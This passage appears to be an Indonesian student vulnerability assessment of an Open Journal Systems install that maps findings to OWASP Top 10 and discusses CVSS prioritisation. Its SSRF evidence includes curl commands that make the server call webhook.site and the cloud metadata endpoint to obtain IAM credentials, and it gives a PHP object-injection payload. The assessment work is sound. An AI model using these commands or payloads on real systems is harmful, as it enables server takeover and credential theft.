Source: AdminHandler.inc.php baris 374–375
Output mencakup:
  - PHP Version: 7.4.x (EOL)
  - Server software: Apache/2.4.x Ubuntu
  - Document root: /var/www/html/ojs
  - Loaded extensions: pdo_mysql, openssl, curl, ...
  - Environment variables termasuk DB_PASSWORD (jika dikonfigurasi)
```

**Bukti — Directory Indexing (VUL-012):**
```
Nikto scan output:
  + /cache/: Directory indexing found
  + /docs/: Directory indexing found
  + /lib/: Directory indexing found
  + /locale/: Directory indexing found
  + /public/: Directory indexing found
  + /styles/: Directory indexing found
Implikasi: Attacker dapat browse file cache yang mungkin berisi data submission
```

**Bukti — IP Internal Exposed (VUL-013):**
```
Nikto alert: CVE-2000-0649
Request:  GET /ojs HTTP/1.1
Response: HTTP/1.1 301 Moved Permanently
          Location: http://10.34.100.179/ojs/  ← IP private terekspos
Implikasi: Konfirmasi topologi jaringan internal untuk attacker
```

**Bukti — Cookie tanpa HttpOnly & SameSite (VUL-016):**
```
ZAP Alert: Cookie No HttpOnly Flag & Cookie SameSite Attribute Not Set
Request:  POST http://10.34.100.179/index.php/index/login
Response Header:
  Set-Cookie: OJSSID=gqmqg8cat4epfgm9mpe3dkdvf6; path=/
  ← Tidak ada flag HttpOnly  → JavaScript bisa baca via document.cookie
  ← Tidak ada flag SameSite  → Rentan CSRF attack
```

**Bukti — CSP Header Tidak Ada (VUL-015):**
```
ZAP Alert: Content Security Policy (CSP) Header Not Set
Affected endpoints (5):
  - http://10.34.100.179/index.php/index/login
  - http://10.34.100.179/index.php/jnads/management/settings/website
  - http://10.34.100.179/index.php/jnads/management/settings/access
  - http://10.34.100.179/index.php/jnads/management/settings/distribution
  - http://10.34.100.179/index.php/index/admin/settings
```

**Bukti — CORS Misconfiguration (VUL-017):**
```
ZAP Alert: Cross-Domain Misconfiguration
URL: http://10.34.100.179/index.php/jnads/api/v1/submissions
Response Header:
  Access-Control-Allow-Origin: *
  ← Wildcard origin → request dari domain manapun diizinkan
  ← Endpoint ini mengekspos data submission yang seharusnya terlindungi
```

**Bukti — Server Version Leak (VUL-018):**
```
ZAP/Nikto alert: Server Leaks Version Information
Response Header:
  Server: Apache/2.4.41 (Ubuntu)
  X-Powered-By: PHP/7.4.x
  X-Generator: Open Journal Systems 3.3.0.8
→ Attacker dapat langsung mencari CVE spesifik untuk versi-versi ini
```

---

### A06 — Vulnerable & Outdated Components

OWASP ZAP mendeteksi penggunaan library JavaScript yang rentan pada OJS 3.3.0-8 (VUL-014).

**Bukti — Vulnerable JS Library (VUL-014):**
```
ZAP Alert: Vulnerable JS Library
Files affected:
  - http://10.34.100.179/lib/pkp/js/build.js
    Library: jQuery version < 3.5.0 (contains XSS vulnerabilities)
  - http://10.34.100.179/lib/pkp/js/vendor/jquery.validate.min.js
    Library: jQuery Validate outdated version
Implikasi: Library JS yang rentan di sisi klien dapat dieksploitasi untuk
           DOM-based XSS atau manipulasi event handler yang tidak terduga
```

---

### A08 — Software & Data Integrity Failures

Penggunaan `unserialize()` di `DAO.inc.php` (VUL-006) merupakan representasi klasik dari kategori ini.

**Bukti — Insecure Deserialization (VUL-006):**
```php
// DAO.inc.php — _fromRow() method
case 'object':
case 'array':
    $decodedValue = json_decode($value, true);
    if (!is_null($decodedValue)) {
        $value = $decodedValue;
    } else {
        $value = unserialize($value); // ← PHP Object Injection
        // Skenario eksploitasi:
        // 1. Attacker berhasil write ke database (via SQLi atau akses DB langsung)
        // 2. Inject serialized PHP object: O:8:"UserData":1:{s:4:"path";s:9:"/etc/passwd";}
        // 3. Saat OJS membaca data tersebut, unserialize() dieksekusi
        // 4. Jika ada "gadget chain" di codebase → RCE
        // Catatan: OJS codebase yang besar meningkatkan kemungkinan gadget chain tersedia
    }
    break;
```

---

### A10 — Server-Side Request Forgery (SSRF)

Ini adalah temuan yang paling konkret dalam assessment ini karena **berhasil direproduksi secara manual**.

**Bukti — SSRF Terkonfirmasi (VUL-001, CVE-2021-27188):**
```bash
# Step 1: Dapatkan session aktif dengan login sebagai Journal Manager
# Session: ojsSession=gqmqg8cat4epfgm9mpe3dkdvf6

# Step 2: Kirim request ke endpoint pengaturan stylesheet
$ curl -b "ojsSession=gqmqg8cat4epfgm9mpe3dkdvf6" \
  -X POST http://10.34.100.179/index.php/jnads/management/settings/website \
  --data "styleSheet[uploadedFile]=https://webhook.site/35f2a429-1321-408e-bd72-1c80b6faf006/evil.css"

# Step 3: Konfirmasi di webhook.site dashboard
# → Request diterima dari IP 10.34.100.179 ✓ (server OJS yang melakukan fetch)
# → SSRF confirmed: server OJS berhasil dikendalikan untuk fetch URL eksternal
```

```
Skenario lanjutan (jika VPS di cloud AWS):
$ curl -b "ojsSession=..." \
  -X POST http://10.34.100.179/index.php/jnads/management/settings/website \
  --data "styleSheet[uploadedFile]=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# → Jika berhasil: mendapatkan IAM role name
# → Follow-up: fetch credential token → AWS credential takeover
```

Adapun, beberapa kerentanan dalam sistem OJS saling memperkuat satu sama lain:

1. XSS + Cookie Misconfiguration
   VUL-005 (XSS) menjadi lebih berbahaya karena VUL-016 (cookie tanpa HttpOnly), 
   memungkinkan attacker mencuri session melalui JavaScript.

2. SSRF → Cloud Metadata Exposure
   VUL-001 (SSRF) dapat digunakan untuk mengakses endpoint internal seperti 
   169.254.169.254 pada cloud environment, berpotensi menghasilkan credential leakage.

3. File Upload → Remote Code Execution
   VUL-007 memungkinkan attacker mengupload file berbahaya (misalnya PHP shell) 
   yang dapat dieksekusi jika server tidak dikonfigurasi dengan aman.

Hal ini menunjukkan bahwa risiko sistem tidak hanya berasal dari satu kerentanan, 
tetapi dari kombinasi beberapa kelemahan yang saling berinteraksi.

---

## 8. Deliverable Pertemuan 4

| No | Deliverable | Format | Dikumpulkan Via |
|---|---|---|---|
| 1 | Risk Register lengkap (semua temuan dari Pertemuan 3) | `.md` / Excel | GitHub |
| 2 | CVSS score calculation untuk minimal 5 temuan kritis | `.md` | GitHub |
| 3 | Risk matrix diagram (visual) | `.png` | GitHub |
| 4 | Pemetaan temuan ke OWASP Top 10 | `.md` | GitHub |
| 5 | Narasi analisis per kategori OWASP yang relevan | `.md` | GitHub |

---

## 9. Pertanyaan Diskusi

**1. Mengapa sebuah kerentanan dengan CVSS 9.8 (Critical) bisa memiliki actual risk yang lebih rendah dari CVSS 6.5 (Medium) dalam konteks bisnis tertentu?**

CVSS Base Score hanya mengukur karakteristik teknis kerentanan secara universal tanpa mempertimbangkan konteks lingkungan dan bisnis. Actual risk ditentukan oleh tiga faktor tambahan: likelihood eksploitasi nyata, nilai aset yang dilindungi, dan kontrol yang sudah ada.

Contoh konkret: VUL-003 (SQLi latent, CVSS 8.1) memiliki likelihood 2 (Low) karena `$tableName` dalam praktiknya di-hardcode di codebase dan tidak bisa dikontrol langsung dari input HTTP. Sebaliknya, VUL-001 (SSRF, CVSS 7.7) memiliki likelihood 4 (High) karena sudah terkonfirmasi bisa dieksploitasi dengan `curl` biasa. Maka meskipun CVSS VUL-003 lebih tinggi, actual risk VUL-001 lebih besar dalam konteks OJS ini.

Lebih jauh: sebuah CVSS 9.8 pada software yang dijalankan di mesin air-gapped tanpa koneksi internet memiliki actual risk mendekati nol, sementara CVSS 6.5 pada sistem yang menghadap publik dengan data finansial bernilai tinggi bisa jauh lebih berbahaya. Inilah mengapa CVSS Temporal Score (mempertimbangkan exploit maturity dan patch availability) dan Environmental Score (mempertimbangkan confidentiality/integrity/availability requirement bisnis spesifik) jauh lebih relevan untuk pengambilan keputusan nyata dibanding Base Score semata.

---

**2. Jelaskan perbedaan CVSS Base Score, Temporal Score, dan Environmental Score! Mana yang paling relevan untuk laporan vulnerability assessment institusi pendidikan?**

**Base Score** mengukur karakteristik intrinsik dan konstan dari kerentanan — bagaimana cara eksploitasi (AV, AC, PR, UI), scope dampaknya, dan seberapa parah dampak terhadap CIA. Skor ini tidak berubah terlepas dari lingkungan manapun kerentanan berada.

**Temporal Score** memodifikasi Base Score berdasarkan faktor waktu yang bisa berubah: apakah sudah ada exploit publik (Exploit Code Maturity), apakah mitigasi atau workaround sudah tersedia (Remediation Level), dan seberapa terkonfirmasi kerentanan ini (Report Confidence). Skor ini bisa turun signifikan jika vendor sudah merilis patch atau workaround resmi.

**Environmental Score** memodifikasi Temporal Score berdasarkan konteks spesifik organisasi: seberapa penting Confidentiality, Integrity, dan Availability untuk aset tersebut di organisasi ini (Modified Impact), dan kontrol keamanan apa yang sudah ada (Modified Attack metrics). Ini adalah skor yang paling akurat mencerminkan risiko nyata bagi organisasi tertentu.

**Yang paling relevan untuk institusi pendidikan adalah Environmental Score**, dengan alasan: (1) OJS menyimpan data akademis yang confidentiality-nya mungkin tidak sekritis data finansial, tapi integrity-nya sangat kritis (hasil review, keputusan publikasi). (2) Availability OJS mungkin tidak 24/7 kritis seperti perbankan, menurunkan beberapa skor. (3) Institusi pendidikan biasanya memiliki limited IT security budget, jadi memprioritaskan berdasarkan Environmental Score yang kontekstual jauh lebih actionable daripada mendahulukan CVSS 9.8 yang secara praktis sulit dieksploitasi di lingkungan mereka.

---

**3. Dalam kasus OJS, apakah A06 (Vulnerable & Outdated Components) seharusnya mendapatkan skor tinggi? Jelaskan argumen Anda!**

**Ya, seharusnya mendapatkan skor lebih tinggi dari yang terdeteksi.** Temuan VUL-014 hanya mencakup library JavaScript yang terdeteksi ZAP, tapi ada gambaran yang lebih besar yang perlu dipertimbangkan.

OJS 3.3.0-8 sendiri adalah versi dengan CVE terdokumentasi (CVE-2021-27188 yang sudah terkonfirmasi dalam assessment ini). PHP 7.4 yang digunakan sudah End of Life sejak November 2022 — tidak ada lagi security patch dari PHP project, artinya setiap CVE PHP baru yang ditemukan setelah itu tidak akan pernah dipatch. Apache versi yang terekspos di header juga perlu diperiksa statusnya.

Argumen untuk skor tinggi: (1) Komponen EOL bukan hanya "potensi rentan" tapi **secara definitif tidak akan mendapat patch** — ini adalah risiko yang terus meningkat seiring waktu. (2) CVE-2021-27188 yang terkonfirmasi terjadi justru karena versi OJS yang digunakan sudah outdated dan belum diupgrade ke versi yang telah difix. (3) Dalam konteks OWASP, A06 secara historis selalu masuk Top 10 justru karena dampaknya sistemik — satu komponen outdated bisa menjadi entry point untuk mengeksploitasi banyak kerentanan lain.

Kesimpulan: jika seluruh ekosistem komponen (OJS, PHP, Apache, jQuery) diperhitungkan, A06 seharusnya mendapat Risk Rating **High** dengan prioritas 2, bukan hanya Medium dengan satu temuan library JS.

---

**4. Seandainya Anda adalah CISO universitas yang menggunakan OJS, kerentanan mana (VUL-001 s/d VUL-018) yang akan Anda prioritaskan perbaikan pertama kali dan mengapa?**

**Prioritas 1 — VUL-007 (File Upload tanpa Validasi, CVSS 9.0 Critical)**

Ini adalah prioritas tertinggi karena memiliki potensi dampak paling katastrofik dengan barrier eksploitasi yang rendah. Seorang Author — yang registrasinya bisa dilakukan siapa saja — bisa mengupload PHP shell, dan jika server dikonfigurasi mengizinkan eksekusi PHP di direktori upload, hasilnya adalah Remote Code Execution penuh. RCE berarti attacker bisa mengakses semua data submission, memanipulasi hasil review, mencuri credentials database, dan bahkan menggunakan server sebagai pivot ke sistem universitas lain. Satu Author jahat = server takeover. Fix-nya sederhana: tambahkan whitelist ekstensi dan server-side MIME validation.

**Prioritas 2 — VUL-001 (SSRF terkonfirmasi, CVSS 7.7 High)**

Ini prioritas kedua karena sudah terbukti dapat dieksploitasi — bukan teori, bukan latent. Jika VPS universitas berjalan di cloud (AWS/GCP/Azure), SSRF ini langsung bisa digunakan untuk fetch instance metadata dan mencuri IAM credentials, berujung ke credential takeover seluruh infrastruktur cloud. Fix resmi tersedia (upgrade OJS ke versi terbaru yang telah menutup CVE-2021-27188).

**Prioritas 3 — VUL-003 dan VUL-006 (SQLi latent dan Insecure Deserialization)**

Meski likelihood-nya rendah saat ini, keduanya memiliki business impact Critical (potensi data breach dan RCE). Ini harus diperbaiki sebelum ada vektor lain yang membuka jalan eksploitasinya — karena begitu attacker sudah dapat akses partial ke sistem, kerentanan-kerentanan ini menjadi sangat berbahaya.

Logika urutannya: VUL-007 diprioritaskan karena bisa dieksploitasi langsung oleh user dengan privilege paling rendah (Author), VUL-001 karena sudah terkonfirmasi aktif, dan VUL-003/006 karena dampak potensialnya bisa menghancurkan seluruh integritas data akademis universitas.

---

## Referensi

- OWASP Top 10 2021: https://owasp.org/Top10/
- NVD CVSS v3.1 Calculator: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
- OWASP Risk Rating Methodology: https://owasp.org/www-community/OWASP_Risk_Rating_Methodology
- CVE-2021-27188 (OJS SSRF): https://nvd.nist.gov/vuln/detail/CVE-2021-27188
- CVE-2000-0649 (IP Disclosure): https://nvd.nist.gov/vuln/detail/CVE-2000-0649
- CWE/SANS Top 25: https://cwe.mitre.org/top25/
- PHP unserialize() Object Injection: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
- First.org CVSS v3.1 Specification: https://www.first.org/cvss/specification-document
